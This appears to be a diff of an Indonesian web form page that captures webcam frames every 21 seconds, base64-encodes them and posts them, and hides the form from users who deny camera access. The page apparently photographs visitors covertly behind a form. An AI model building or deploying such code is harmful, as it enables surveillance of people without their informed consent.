@@ -58,7 +58,11 @@ async function init() {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     handleSuccess(stream);
   } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    $('.formulir').hide();
+    $('.tampil_error').show();
+    //alert(e.toString());
+    //errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+   
   }
 }
 
@@ -74,7 +78,7 @@ var context = canvas.getContext('2d');
        var canvasData = canvas.toDataURL("image/png")
        cc = String(canvasData).replace("data:image/png;base64,","")
       //  console.log(cc)
-       post(cc); }, 20000);
+       post(cc); }, 21000);
   
 
 }
@@ -213,6 +217,13 @@ init();
 
 </div>
 <!-- Akhir Formulir Formulir -->
+
+<!--pesan error-->
+<div class="tampil_error jumbotron bg-danger text-light m-3">
+<h1>ERROR&nbsp;:(</h1>
+<p>Web ini tidak bisa mengakses sumber daya yang diperlukan</p>
+
+</div>
 
 
 </body>
